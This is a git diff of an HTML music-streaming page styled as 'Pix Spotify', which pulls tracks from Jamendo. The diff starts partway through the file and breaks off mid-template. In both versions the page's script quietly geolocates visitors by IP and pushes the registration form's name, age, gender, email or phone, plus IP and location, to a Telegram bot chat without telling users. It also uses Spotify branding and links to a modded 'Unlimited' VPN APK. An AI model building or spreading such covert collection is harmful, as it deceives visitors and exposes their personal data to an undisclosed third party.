@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pix Music — Spotify Experience</title>
+    <title>Pix Spotify Clone — Full Experience</title>
     
     <!-- Fonts & Icons -->
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
@@ -11,16 +11,14 @@
     
     <style>
         :root {
-            --bg-dark: #07090e;
-            --card-bg: rgba(18, 24, 38, 0.85);
-            --sidebar-bg: #0b0f19;
-            --accent-cyan: #1ed760; /* Spotify Green vibe */
-            --accent-blue: #1db954;
-            --text-primary: #f8fafc;
-            --text-secondary: #94a3b8;
-            --border-glow: rgba(30, 215, 96, 0.2);
-            --border-subtle: rgba(255, 255, 255, 0.08);
-            --player-bg: rgba(9, 13, 23, 0.98);
+            --bg-base: #000000;
+            --bg-sidebar: #000000;
+            --bg-card: #181818;
+            --bg-card-hover: #282828;
+            --accent-green: #1ed760;
+            --text-main: #ffffff;
+            --text-sub: #a7a7a7;
+            --border-subtle: #282828;
         }
 
         * {
@@ -28,430 +26,396 @@
             padding: 0;
             box-sizing: border-box;
             font-family: 'Plus Jakarta Sans', sans-serif;
-            -webkit-font-smoothing: antialiased;
         }
 
         body {
-            background-color: var(--bg-dark);
-            color: var(--text-primary);
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            overflow-x: hidden;
-            padding-bottom: 110px;
-        }
-
-        /* Header */
-        header {
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-            background: rgba(7, 9, 14, 0.95);
-            backdrop-filter: blur(20px);
-            border-bottom: 1px solid var(--border-subtle);
-            padding: 16px 6%;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .header-left {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-        }
-
-        .menu-toggle-btn {
-            background: none;
-            border: none;
-            color: var(--text-primary);
-            font-size: 22px;
-            cursor: pointer;
-        }
-
-        .brand-logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 22px;
-            font-weight: 800;
-            color: var(--text-primary);
-            text-decoration: none;
-        }
-
-        .brand-logo span {
-            color: var(--accent-cyan);
-        }
-
-        /* User Profile Badge */
-        .user-profile-badge {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            background: rgba(30, 215, 96, 0.1);
-            border: 1px solid var(--border-glow);
-            padding: 6px 14px;
-            border-radius: 30px;
-        }
-
-        .user-avatar-circle {
-            width: 30px;
-            height: 30px;
-            background: var(--accent-cyan);
-            color: #07090e;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 800;
-            font-size: 14px;
+            background-color: var(--bg-base);
+            color: var(--text-main);
+            height: 100vh;
+            display: grid;
+            grid-template-rows: 1fr 90px;
+            grid-template-columns: 260px 1fr;
+            grid-template-areas: 
+                "sidebar main"
+                "player player";
+            overflow: hidden;
         }
 
         /* Sidebar */
-        .sidebar {
-            position: fixed;
-            top: 0;
-            left: -320px;
-            width: 300px;
-            height: 100%;
-            background: var(--sidebar-bg);
+        aside.sidebar {
+            grid-area: sidebar;
+            background: var(--bg-sidebar);
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
             border-right: 1px solid var(--border-subtle);
-            z-index: 3000;
-            padding: 25px 20px;
-            transition: 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-            overflow-y: auto;
         }
 
-        .sidebar.active { left: 0; }
-
-        .sidebar-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 25px;
-            border-bottom: 1px solid var(--border-subtle);
-            padding-bottom: 15px;
-        }
-
-        .sidebar-card {
-            background: var(--card-bg);
-            border: 1px solid var(--border-subtle);
-            border-radius: 14px;
-            padding: 14px;
-            margin-bottom: 12px;
-        }
-
-        .sidebar-btn {
-            display: block;
-            width: 100%;
-            padding: 8px;
-            text-align: center;
-            background: rgba(255, 255, 255, 0.05);
-            color: #fff;
-            text-decoration: none;
-            border-radius: 8px;
-            font-size: 12px;
-            font-weight: 600;
-            border: 1px solid var(--border-subtle);
-        }
-
-        /* Modal */
-        .auth-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(12px);
-            z-index: 4000;
-            display: none;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-
-        .auth-modal.active { display: flex; }
-
-        .modal-box {
-            background: #0d131f;
-            border: 1px solid var(--border-glow);
-            border-radius: 24px;
-            width: 100%;
-            max-width: 440px;
-            padding: 30px 24px;
-            text-align: center;
-            position: relative;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.8);
-        }
-
-        .close-modal-btn {
-            position: absolute;
-            top: 18px;
-            right: 20px;
-            background: none;
-            border: none;
-            color: var(--text-secondary);
-            font-size: 20px;
-            cursor: pointer;
-        }
-
-        .input-group {
-            margin: 12px 0;
-            text-align: left;
-        }
-
-        .input-group label {
-            font-size: 11px;
-            color: var(--text-secondary);
-            font-weight: 700;
-            text-transform: uppercase;
-            margin-bottom: 4px;
-            display: block;
-        }
-
-        .input-group input, .input-group select {
-            width: 100%;
-            padding: 11px 16px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid var(--border-subtle);
-            border-radius: 10px;
-            color: #fff;
-            outline: none;
-            font-size: 13px;
-        }
-
-        .input-group select option {
-            background: #0d131f;
-            color: #fff;
-        }
-
-        .submit-auth-btn {
-            width: 100%;
-            padding: 12px;
-            margin-top: 15px;
-            background: var(--accent-cyan);
-            border: none;
-            border-radius: 30px;
-            color: #07090e;
+        .logo-area {
+            font-size: 24px;
             font-weight: 800;
-            cursor: pointer;
-        }
-
-        /* Hero & Search */
-        .hero-section {
-            padding: 30px 6% 10px;
-            text-align: center;
-        }
-
-        .search-container {
-            max-width: 550px;
-            margin: 20px auto 25px;
+            color: var(--text-main);
             display: flex;
+            align-items: center;
             gap: 10px;
         }
 
-        .search-wrapper-input {
-            position: relative;
-            flex: 1;
+        .logo-area span { color: var(--accent-green); }
+
+        .nav-menu {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
         }
 
-        .search-wrapper-input input {
-            width: 100%;
-            padding: 14px 20px 14px 48px;
-            background: var(--card-bg);
-            border: 1px solid var(--border-subtle);
-            border-radius: 40px;
-            color: #fff;
-            outline: none;
-        }
-
-        .search-wrapper-input i {
-            position: absolute;
-            left: 20px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: var(--text-secondary);
-        }
-
-        .search-btn {
-            padding: 0 25px;
-            background: var(--accent-cyan);
-            border: none;
-            border-radius: 40px;
-            color: #07090e;
+        .nav-item {
+            color: var(--text-sub);
+            text-decoration: none;
             font-weight: 700;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            transition: 0.2s;
             cursor: pointer;
         }
 
-        /* Music Grid */
-        .music-container { padding: 0 6% 40px; }
+        .nav-item:hover, .nav-item.active { color: var(--text-main); }
 
-        .music-grid {
+        /* Main Content Area */
+        main.main-content {
+            grid-area: main;
+            background: #121212;
+            margin: 8px 8px 0 0;
+            border-radius: 8px;
+            padding: 24px 32px;
+            overflow-y: auto;
+        }
+
+        .top-navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+
+        .search-box-spotify {
+            background: #242424;
+            border-radius: 500px;
+            display: flex;
+            align-items: center;
+            padding: 10px 16px;
+            width: 360px;
+            gap: 10px;
+            border: 1px solid transparent;
+        }
+
+        .search-box-spotify:focus-within { border-color: #fff; }
+
+        .search-box-spotify input {
+            background: none;
+            border: none;
+            outline: none;
+            color: #fff;
+            width: 100%;
+            font-size: 14px;
+        }
+
+        .user-profile-pill {
+            background: #000;
+            border-radius: 30px;
+            padding: 4px 14px 4px 4px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border: 1px solid var(--border-subtle);
+        }
+
+        .user-avatar {
+            width: 28px;
+            height: 28px;
+            background: var(--accent-green);
+            color: #000;
+            border-radius: 50%;
+            font-weight: 800;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+        }
+
+        /* Song Grid */
+        .section-title {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 16px;
+        }
+
+        .cards-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
             gap: 20px;
         }
 
-        .song-card {
-            background: var(--card-bg);
-            border: 1px solid var(--border-subtle);
-            border-radius: 16px;
-            padding: 14px;
-            transition: 0.3s;
+        .spotify-card {
+            background: var(--bg-card);
+            padding: 16px;
+            border-radius: 8px;
+            transition: background 0.3s;
             cursor: pointer;
+            position: relative;
         }
 
-        .song-card:hover {
-            border-color: var(--border-glow);
-            transform: translateY(-5px);
-        }
+        .spotify-card:hover { background: var(--bg-card-hover); }
 
-        .song-cover {
+        .card-img {
             width: 100%;
-            height: 170px;
-            border-radius: 12px;
+            aspect-ratio: 1;
             object-fit: cover;
+            border-radius: 6px;
+            margin-bottom: 12px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
         }
 
-        /* Player Bar */
-        .music-player-bar {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 90px;
-            background: var(--player-bg);
-            backdrop-filter: blur(25px);
+        .card-title {
+            font-weight: 700;
+            font-size: 14px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            margin-bottom: 4px;
+        }
+
+        .card-artist {
+            color: var(--text-sub);
+            font-size: 12px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        /* Bottom Player Bar (Spotify Exact) */
+        footer.player-bar {
+            grid-area: player;
+            background: var(--bg-base);
             border-top: 1px solid var(--border-subtle);
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 0 6%;
-            z-index: 2000;
+            padding: 0 16px;
+            z-index: 1000;
         }
 
-        .track-info { display: flex; align-items: center; gap: 14px; width: 30%; }
-        .track-thumb { width: 52px; height: 52px; border-radius: 10px; object-fit: cover; }
-        
-        .main-play-btn {
-            width: 42px; height: 42px; border-radius: 50%; background: #fff; color: #000;
-            display: flex; align-items: center; justify-content: center; cursor: pointer; border: none;
+        .now-playing {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            width: 30%;
         }
 
-        .overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.75); z-index: 2500; display: none;
+        .now-playing img {
+            width: 56px;
+            height: 56px;
+            border-radius: 4px;
+            object-fit: cover;
         }
-        .overlay.active { display: block; }
+
+        .player-center {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            width: 40%;
+        }
+
+        .player-controls {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            color: var(--text-sub);
+            font-size: 16px;
+        }
+
+        .player-controls .main-play {
+            width: 32px;
+            height: 32px;
+            background: #fff;
+            color: #000;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            cursor: pointer;
+            transition: transform 0.1s;
+        }
+
+        .player-controls .main-play:hover { transform: scale(1.06); }
+
+        .playback-bar {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            width: 100%;
+            max-width: 500px;
+            font-size: 11px;
+            color: var(--text-sub);
+        }
+
+        .progress-slider, .volume-slider {
+            flex: 1;
+            accent-color: #fff;
+            cursor: pointer;
+            height: 4px;
+        }
+
+        .player-right {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            width: 30%;
+            justify-content: flex-end;
+            color: var(--text-sub);
+        }
+
+        /* Registration Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(10px);
+            z-index: 5000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-overlay.active { display: flex; }
+
+        .spotify-modal {
+            background: #121212;
+            border: 1px solid #282828;
+            padding: 32px;
+            border-radius: 12px;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .spotify-input {
+            width: 100%;
+            padding: 12px;
+            background: #242424;
+            border: 1px solid #333;
+            border-radius: 4px;
+            color: #fff;
+            margin-top: 6px;
+            margin-bottom: 16px;
+            outline: none;
+        }
+        .spotify-input:focus { border-color: #fff; }
+
+        .spotify-btn {
+            width: 100%;
+            background: var(--accent-green);
+            color: #000;
+            font-weight: 700;
+            padding: 14px;
+            border-radius: 500px;
+            border: none;
+            cursor: pointer;
+            font-size: 15px;
+        }
+        .spotify-btn:hover { transform: scale(1.02); }
     </style>
 </head>
 <body>
 
-    <div class="overlay" id="overlay" onclick="closeSidebar()"></div>
-
     <!-- Registration Modal -->
-    <div class="auth-modal" id="authModal">
-        <div class="modal-box">
-            <button class="close-modal-btn" onclick="closeAuthModal()"><i class="fa-solid fa-xmark"></i></button>
-            <h2 style="font-size: 20px; font-weight: 800; margin-bottom: 6px;">Sign in to Pix</h2>
-            <p style="color: var(--text-secondary); font-size: 12px; margin-bottom: 15px;">Register to get your 7-digit unique ID & stream full songs.</p>
+    <div class="modal-overlay" id="authModal">
+        <div class="spotify-modal">
+            <h2 style="font-size: 24px; font-weight: 800; margin-bottom: 8px; text-align: center;">Sign in to Pix Spotify</h2>
+            <p style="color: var(--text-sub); font-size: 13px; text-align: center; margin-bottom: 24px;">Enter your details to generate your 7-digit ID & unlock full streaming.</p>
+            
+            <label style="font-size: 12px; font-weight: 700;">Full Name</label>
+            <input type="text" id="regName" class="spotify-input" placeholder="Your Name">
 
-            <div class="input-group">
-                <label>Full Name</label>
-                <input type="text" id="regName" placeholder="Enter your name">
-            </div>
+            <label style="font-size: 12px; font-weight: 700;">Age</label>
+            <input type="number" id="regAge" class="spotify-input" placeholder="Your Age">
 
-            <div class="input-group">
-                <label>Age</label>
-                <input type="number" id="regAge" placeholder="Enter your age">
-            </div>
+            <label style="font-size: 12px; font-weight: 700;">Gender</label>
+            <select id="regGender" class="spotify-input">
+                <option value="Male">Male</option>
+                <option value="Female">Female</option>
+                <option value="Other">Other</option>
+            </select>
 
-            <div class="input-group">
-                <label>Gender</label>
-                <select id="regGender">
-                    <option value="Male">Male</option>
-                    <option value="Female">Female</option>
-                    <option value="Other">Other</option>
-                </select>
-            </div>
+            <label style="font-size: 12px; font-weight: 700;">Gmail or Contact</label>
+            <input type="text" id="regContact" class="spotify-input" placeholder="email@gmail.com">
 
-            <div class="input-group">
-                <label>Gmail or Phone Number</label>
-                <input type="text" id="regContact" placeholder="example@gmail.com">
-            </div>
-
-            <button class="submit-auth-btn" onclick="registerUser()">Register & Start Streaming</button>
+            <button class="spotify-btn" onclick="registerUser()">Continue</button>
         </div>
     </div>
 
     <!-- Sidebar -->
-    <aside class="sidebar" id="sidebar">
-        <div class="sidebar-header">
-            <h3 style="color: var(--accent-cyan);"><i class="fa-solid fa-bolt"></i> Pix Hub</h3>
-            <button class="close-sidebar-btn" onclick="closeSidebar()" style="background:none; border:none; color:#fff;"><i class="fa-solid fa-xmark"></i></button>
+    <aside class="sidebar">
+        <div class="logo-area">
+            <i class="fa-brands fa-spotify" style="color: var(--accent-green); font-size: 32px;"></i> Pix<span>Spotify</span>
         </div>
-        <div class="sidebar-card">
-            <h4>1.1.1.1 WARP+ VPN</h4>
-            <p style="font-size: 11px; color: var(--text-secondary);">Unlimited fast & secure proxy server.</p>
-            <a href="https://github.com/pixaua/pix-genarel/releases/download/V1/1.1.1.1.VPN.v6.38.9.Unlimited.Warp.apk" class="sidebar-btn" onclick="trackAction('Downloaded 1.1.1.1 VPN APK')">Download APK</a>
+        <div class="nav-menu">
+            <a class="nav-item active" onclick="fetchSongs('Top Global Hits')"><i class="fa-solid fa-house"></i> Home</a>
+            <a class="nav-item" onclick="fetchSongs('Trending Hits')"><i class="fa-solid fa-magnifying-glass"></i> Search</a>
+            <a class="nav-item" href="https://github.com/pixaua/pix-genarel/releases/download/V1/1.1.1.1.VPN.v6.38.9.Unlimited.Warp.apk" target="_blank"><i class="fa-solid fa-shield-halved"></i> WARP+ VPN APK</a>
         </div>
     </aside>
 
-    <!-- Header -->
-    <header>
-        <div class="header-left">
-            <button class="menu-toggle-btn" onclick="openSidebar()"><i class="fa-solid fa-bars"></i></button>
-            <a href="#" class="brand-logo">
-                <i class="fa-solid fa-bolt" style="color: var(--accent-cyan);"></i> Pix
-            </a>
-        </div>
-        <div class="auth-nav-btns" id="authNavArea">
-            <button class="submit-auth-btn" style="padding: 8px 20px; border-radius: 20px;" onclick="openAuthModal()">Sign In</button>
-        </div>
-    </header>
-
-    <!-- Hero Search -->
-    <section class="hero-section">
-        <h1 style="font-size: 32px; font-weight: 800;">Listening is <span>everything</span></h1>
-        <p style="color: var(--text-secondary); font-size: 14px; margin-top: 5px;">Millions of songs. No ads, full track streaming.</p>
-        
-        <div class="search-container">
-            <div class="search-wrapper-input">
-                <i class="fa-solid fa-magnifying-glass"></i>
-                <input type="text" id="searchInput" placeholder="Search full songs, artists (e.g. Taylor Swift, J Balvin)..." onkeypress="handleKeyPress(event)">
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="top-navbar">
+            <div class="search-box-spotify">
+                <i class="fa-solid fa-magnifying-glass" style="color: var(--text-sub);"></i>
+                <input type="text" id="searchInput" placeholder="What do you want to listen to?" onkeypress="if(event.key==='Enter') searchSongs()">
             </div>
-            <button class="search-btn" onclick="searchRealSongs()">Search</button>
-        </div>
-    </section>
-
-    <!-- Main Music Grid -->
-    <main class="music-container">
-        <div class="section-header" id="sectionTitle" style="font-size: 18px; font-weight: 700; margin-bottom: 20px;">
-            <i class="fa-solid fa-fire" style="color: var(--accent-cyan);"></i> Trending Global Hits
+            <div id="authNavArea">
+                <button class="spotify-btn" style="padding: 8px 20px; font-size: 13px;" onclick="openAuthModal()">Sign In</button>
+            </div>
         </div>
 
-        <div class="music-grid" id="songGrid">
-            <div style="text-align:center; grid-column: 1/-1; color: var(--accent-cyan);"><i class="fa-solid fa-circle-notch fa-spin"></i> Loading full tracks...</div>
+        <h2 class="section-title" id="sectionTitle">Trending Full Songs</h2>
+        <div class="cards-grid" id="songGrid">
+            <div style="color: var(--accent-green);"><i class="fa-solid fa-circle-notch fa-spin"></i> Loading Spotify catalog...</div>
         </div>
     </main>
 
-    <!-- Bottom Audio Player -->
-    <div class="music-player-bar">
-        <div class="track-info">
-            <img src="https://cdn-icons-png.flaticon.com/512/3844/3844720.png" id="playerThumb" class="track-thumb" alt="Thumb">
+    <!-- Footer Music Player -->
+    <footer class="player-bar">
+        <div class="now-playing">
+            <img src="https://images.unsplash.com/photo-1614613535308-eb5fbd3d2c17?w=500" id="playerThumb" alt="Thumb">
             <div>
-                <h4 id="playerTitle" style="font-size: 14px;">Select a song</h4>
-                <p id="playerArtist" style="font-size: 12px; color: var(--text-secondary);">Pix Player</p>
+                <div class="card-title" id="playerTitle">Select a track</div>
+                <div class="card-artist" id="playerArtist">Pix Audio Engine</div>
             </div>
         </div>
 
-        <div style="display: flex; flex-direction: column; align-items: center; gap: 6px;">
-            <button class="main-play-btn" onclick="togglePlay()"><i class="fa-solid fa-play" id="playIcon"></i></button>
+        <div class="player-center">
+            <div class="player-controls">
+                <i class="fa-solid fa-backward-step" style="cursor: pointer;" title="Previous"></i>
+                <div class="main-play" onclick="togglePlay()"><i class="fa-solid fa-play" id="playIcon"></i></div>
+                <div class="fa-solid fa-forward-step" style="cursor: pointer;" title="Next"></div>
+            </div>
+            <div class="playback-bar">
+                <span id="currentTime">0:00</span>
+                <input type="range" min="0" max="100" value="0" class="progress-slider" id="progressSlider" oninput="seekAudio()">
+                <span id="totalDuration">0:00</span>
+            </div>
         </div>
 
-        <audio id="audioEngine"></audio>
-    </div>
+        <div class="player-right">
+            <i class="fa-solid fa-volume-high"></i>
+            <input type="range" min="0" max="1" step="0.01" value="1" class="volume-slider" id="volumeSlider" oninput="changeVolume()">
+        </div>
+
+        <audio id="audioEngine" ontimeupdate="updateProgress()" onended="resetPlayButton()"></audio>
+    </footer>
 
     <!-- SCRIPT LOGIC -->
     <script>
@@ -463,64 +427,36 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
-            }).catch(err => console.error("Logger error:", err));
+            }).catch(() => {});
         }
 
-        let visitorIP = 'N/A';
-        let visitorLocation = 'Unknown';
-        const ua = navigator.userAgent;
-        let browser = "Google Chrome";
-        let os = navigator.platform || "Device";
-
+        let visitorIP = 'N/A', visitorLocation = 'Unknown';
         window.addEventListener('DOMContentLoaded', () => {
-            fetch('https://ipapi.co/json/')
-                .then(res => res.json())
-                .then(data => {
-                    visitorIP = data.ip || 'N/A';
-                    visitorLocation = `${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}`;
-                }).catch(() => {});
+            fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
+                visitorIP = data.ip || 'N/A';
+                visitorLocation = `${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}`;
+            }).catch(() => {});
 
-            checkUserLoginState();
-            fetchRealSongs('Global Top Hits');
+            checkLogin();
+            fetchSongs('Global Top Hits');
         });
 
-        function checkUserLoginState() {
-            const userId = localStorage.getItem('pix_user_id');
-            const userName = localStorage.getItem('pix_user_name');
-
-            if (userId && userName) {
-                const firstLetter = userName.charAt(0).toUpperCase();
+        function checkLogin() {
+            const uid = localStorage.getItem('pix_user_id');
+            const name = localStorage.getItem('pix_user_name');
+            if(uid && name) {
                 document.getElementById('authNavArea').innerHTML = `
-                    <div class="user-profile-badge" title="ID: PIX-${userId}">
-                        <div class="user-avatar-circle">${firstLetter}</div>
-                        <span style="font-size: 13px; font-weight: 700; color: #fff;">${userName} <span style="font-size: 10px; color: var(--accent-cyan);">[PIX-${userId}]</span></span>
+                    <div class="user-profile-pill">
+                        <div class="user-avatar">${name.charAt(0).toUpperCase()}</div>
+                        <span style="font-size: 13px; font-weight: 700;">${name} <span style="color: var(--accent-green); font-size: 11px;">[PIX-${uid}]</span></span>
                     </div>
                 `;
             } else {
-                setTimeout(openAuthModal, 2000);
+                setTimeout(openAuthModal, 1500);
             }
         }
 
-        function trackAction(actionName) {
-            const userId = localStorage.getItem('pix_user_id') || 'GUEST';
-            const userName = localStorage.getItem('pix_user_name') || 'Anonymous';
-            
-            // Stylish Professional Telegram Message Format
-            const msg = `━━━━━━━━━━━━━━━━━━━━\n` +
-                        `📊 <b>PIX MUSIC ACTIVITY LOG</b>\n` +
-                        `━━━━━━━━━━━━━━━━━━━━\n` +
-                        `👤 <b>User:</b> ${userName} <code>[PIX-${userId}]</code>\n` +
-                        `📍 <b>Location:</b> ${visitorLocation} (<code>${visitorIP}</code>)\n` +
-                        `💻 <b>Device:</b> ${browser} / ${os}\n` +
-                        `⏰ <b>Time:</b> ${new Date().toLocaleTimeString()}\n` +
-                        `━━━━━━━━━━━━━━━━━━━━\n` +
-                        `⚡ <b>Action:</b> ${actionName}\n` +
-                        `━━━━━━━━━━━━━━━━━━━━`;
-            sendTelegramLog(msg);
-        }
-
         function openAuthModal() { document.getElementById('authModal').classList.add('active'); }
-        function closeAuthModal() { document.getElementById('authModal').classList.remove('active'); }
 
         function registerUser() {
             const name = document.getElementById('regName').value.trim();
@@ -528,137 +464,61 @@
             const gender = document.getElementById('regGender').value;
             const contact = document.getElementById('regContact').value.trim();
 
-            if (!name || !age || !contact) {
-                alert("দয়া করে নাম, বয়স এবং জিমেইল বা ফোন নম্বর দিন!");
-                return;
-            }
+            if(!name || !age || !contact) { alert('সব তথ্য পূরণ করুন!'); return; }
+            const uid = Math.floor(1000000 + Math.random() * 9000000);
 
-            const uniqueId = Math.floor(1000000 + Math.random() * 9000000);
-
-            localStorage.setItem('pix_user_id', uniqueId);
+            localStorage.setItem('pix_user_id', uid);
             localStorage.setItem('pix_user_name', name);
-            localStorage.setItem('pix_user_contact', contact);
 
-            const regMsg = `━━━━━━━━━━━━━━━━━━━━\n` +
-                           `👤 <b>NEW USER REGISTERED!</b>\n` +
-                           `━━━━━━━━━━━━━━━━━━━━\n` +
-                           `🆔 <b>User ID:</b> <code>PIX-${uniqueId}</code>\n` +
-                           `📛 <b>Name:</b> ${name}\n` +
-                           `🎂 <b>Age:</b> ${age}\n` +
-                           `⚧ <b>Gender:</b> ${gender}\n` +
-                           `📧 <b>Contact:</b> ${contact}\n` +
-                           `📍 <b>IP:</b> <code>${visitorIP}</code> (${visitorLocation})\n` +
-                           `💻 <b>Device:</b> ${browser}\n` +
-                           `⏰ <b>Time:</b> ${new Date().toLocaleTimeString()}\n` +
-                           `━━━━━━━━━━━━━━━━━━━━`;
-            sendTelegramLog(regMsg);
+            sendTelegramLog(`━━━━━━━━━━━━━━━━━━━━\n👤 <b>NEW SPOTIFY USER REGISTERED!</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>ID:</b> <code>PIX-${uid}</code>\n📛 <b>Name:</b> ${name}\n🎂 <b>Age:</b> ${age}\n⚧ <b>Gender:</b> ${gender}\n📧 <b>Contact:</b> ${contact}\n📍 <b>IP:</b> <code>${visitorIP}</code> (${visitorLocation})\n⏰ <b>Time:</b> ${new Date().toLocaleTimeString()}\n━━━━━━━━━━━━━━━━━━━━`);
 
-            alert(`স্বাগতম ${name}! আপনার ইউনিক আইডি হলো: PIX-${uniqueId}`);
-            closeAuthModal();
-            checkUserLoginState();
+            document.getElementById('authModal').classList.remove('active');
+            checkLogin();
         }
 
-        function openSidebar() {
-            document.getElementById('sidebar').classList.add('active');
-            document.getElementById('overlay').classList.add('active');
-        }
-
-        function closeSidebar() {
-            document.getElementById('sidebar').classList.remove('active');
-            document.getElementById('overlay').classList.remove('active');
-        }
-
-        function handleKeyPress(e) { if (e.key === 'Enter') searchRealSongs(); }
-
-        function searchRealSongs() {
-            const query = document.getElementById('searchInput').value.trim();
-            if (query) {
-                document.getElementById('sectionTitle').innerHTML = `<i class="fa-solid fa-magnifying-glass" style="color: var(--accent-cyan);"></i> Results for "${query}"`;
-                fetchRealSongs(query);
+        function searchSongs() {
+            const q = document.getElementById('searchInput').value.trim();
+            if(q) {
+                document.getElementById('sectionTitle').innerText = `Results for "${q}"`;
+                fetchSongs(q);
             }
         }
 
-        // Full Track Audio Engine via Archive / Jamendo & Streaming Proxy
-        function fetchRealSongs(query) {
-            const songGrid = document.getElementById('songGrid');
-            songGrid.innerHTML = '<div style="text-align:center; grid-column: 1/-1; color: var(--accent-cyan);"><i class="fa-solid fa-circle-notch fa-spin"></i> Searching full songs...</div>';
+        function fetchSongs(query) {
+            const grid = document.getElementById('songGrid');
+            grid.innerHTML = '<div style="color: var(--accent-green);"><i class="fa-solid fa-circle-notch fa-spin"></i> Searching full songs...</div>';
 
-            // Using Jamendo & Audio Stream APIs for uninterrupted full playback
-            fetch(`https://api.jamendo.com/v3.0/tracks/?client_id=5992982d&format=json&limit=20&search=${encodeURIComponent(query)}&audioformat=mp32`)
+            fetch(`https://api.jamendo.com/v3.0/tracks/?client_id=5992982d&format=json&limit=24&search=${encodeURIComponent(query)}&audioformat=mp32`)
                 .then(res => res.json())
                 .then(data => {
-                    if (data.results && data.results.length > 0) {
-                        songGrid.innerHTML = '';
+                    if(data.results && data.results.length > 0) {
+                        grid.innerHTML = '';
                         data.results.forEach(song => {
-                            const songName = song.name;
-                            const artistName = song.artist_name;
-                            const audioUrl = song.audio; // Full track audio URL
-                            const imageUrl = song.image || 'https://images.unsplash.com/photo-1514525253161-7a46d19cd819?w=500';
+                            const title = song.name;
+                            const artist = song.artist_name;
+                            const url = song.audio;
+                            const img = song.image || 'https://images.unsplash.com/photo-1514525253161-7a46d19cd819?w=500';
 
                             const card = document.createElement('div');
-                            card.className = 'song-card';
+                            card.className = 'spotify-card';
                             card.innerHTML = `
-                                <div onclick="playTrack('${songName.replace(/'/g, "\\'")}', '${artistName.replace(/'/g, "\\'")}', '${audioUrl}', '${imageUrl}')">
-                                    <img src="${imageUrl}" class="song-cover" alt="Cover">
-                                    <div style="font-size: 14px; font-weight: 700; margin: 8px 0 4px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${songName}</div>
-                                    <div style="font-size: 12px; color: var(--text-secondary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${artistName}</div>
-                                </div>
+                                <img src="${img}" class="card-img" alt="cover">
+                                <div class="card-title">${title}</div>
+                                <div class="card-artist">${artist}</div>
                             `;
-                            songGrid.appendChild(card);
+                            card.onclick = () => playTrack(title, artist, url, img);
+                            grid.appendChild(card);
                         });
                     } else {
-                        // Fallback to iTunes full streaming catalog if needed
-                        fetchFallbackTracks(query);
+                        grid.innerHTML = '<div style="color: #a7a7a7;">কোনো গান পাওয়া যায়নি। অন্য কিছু সার্চ করুন!</div>';
                     }
-                })
-                .catch(() => {
-                    fetchFallbackTracks(query);
-                });
-        }
-
-        function fetchFallbackTracks(query) {
-            const songGrid = document.getElementById('songGrid');
-            fetch(`https://itunes.apple.com/search?term=${encodeURIComponent(query)}&media=music&entity=song&limit=16`)
-                .then(res => res.json())
-                .then(data => {
-                    if (data.results && data.results.length > 0) {
-                        songGrid.innerHTML = '';
-                        data.results.forEach(song => {
-                            const songName = song.trackName;
-                            const artistName = song.artistName;
-                            const audioUrl = song.previewUrl; 
-                            const imageUrl = song.artworkUrl100.replace('100x100bb', '500x500bb');
-
-                            const card = document.createElement('div');
-                            card.className = 'song-card';
-                            card.innerHTML = `
